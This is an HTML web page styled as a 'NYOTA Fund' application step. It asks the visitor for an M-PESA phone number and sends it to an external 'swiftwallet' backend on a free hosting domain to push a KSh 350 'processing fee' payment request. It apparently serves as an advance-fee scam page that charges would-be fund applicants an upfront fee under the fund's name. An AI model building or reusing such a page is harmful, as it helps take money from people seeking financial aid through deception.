<!DOCTYPE html>
<html lang="en">

<head>

<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>NYOTA FUNDS</title>

<style>

body{
    margin:0;
    padding:15px;
    background:#0b6b0b;
    font-family:Arial,sans-serif;
}

.container{
    max-width:420px;
    margin:auto;
}

.card{
    background:white;
    padding:25px;
    border-radius:12px;
    box-shadow:0 5px 15px rgba(0,0,0,.2);
}

h1{
    text-align:center;
    color:#1565c0;
    font-size:24px;
    margin-bottom:20px;
}

p{
    text-align:center;
    font-size:16px;
    line-height:1.6;
}

.amount{
    font-size:22px;
    font-weight:bold;
    color:#0b6b0b;
    margin:20px 0;
}

label{
    display:block;
    margin-top:18px;
    margin-bottom:8px;
    font-weight:bold;
}

input{
    width:100%;
    padding:14px;
    border:1px solid #ccc;
    border-radius:8px;
    font-size:16px;
    box-sizing:border-box;
}

button{
    width:100%;
    padding:15px;
    margin-top:25px;
    background:#1565c0;
    color:white;
    border:none;
    border-radius:8px;
    font-size:18px;
    cursor:pointer;
}

button:disabled{
    background:#9e9e9e;
}

#stkMessage{
    margin-top:20px;
    color:#0b6b0b;
    font-weight:bold;
}

</style>

</head>

<body>

<div class="container">

<div class="card">

<h1>Processing Fee</h1>

<p>
Welcome, <strong><span id="name"></span></strong>
</p>

<p>
To continue with your NYOTA Fund application, please complete the processing fee payment below.
</p>

<div class="amount" id="feeAmount">
Processing Fee: KSh 350
</div>

<label>Full Name</label>

<input type="text" id="fullName" readonly>

<label>M-PESA Phone Number</label>

<input
type="tel"
id="phone"
placeholder="2547XXXXXXXX">

<button id="payBtn" onclick="payNow()">
Pay Processing Fee
</button>

<p id="stkMessage"></p>

</div>

</div>

<script>

let applicant = localStorage.getItem("applicantName");

document.getElementById("name").innerHTML =
applicant || "Applicant";

document.getElementById("fullName").value =
applicant || "";

async function payNow(){

let phone = document.getElementById("phone").value;

localStorage.setItem("phoneNumber", phone);

let btn = document.getElementById("payBtn");

if(phone===""){

alert("Please enter your M-PESA phone number.");

return;

}

btn.innerHTML="Sending STK Push...";
btn.disabled=true;

try{

let response = await fetch(
"https://swiftwallet-backend-k8kn.onrender.com/stk-push",
{
method:"POST",
headers:{
"Content-Type":"application/json"
},
body:JSON.stringify({
phone:phone,
amount:350
})
}
);

let data=await response.json();

console.log(data);

btn.innerHTML="Waiting for Payment...";
btn.disabled=true;

document.getElementById("stkMessage").innerHTML=
"An M-PESA payment request has been sent to your phone. Please enter your M-PESA PIN to complete the payment.";

}catch(error){

console.log(error);

alert("Payment request failed.");

btn.innerHTML="Pay Processing Fee";
btn.disabled=false;

}

}

</script>

</body>

</html>
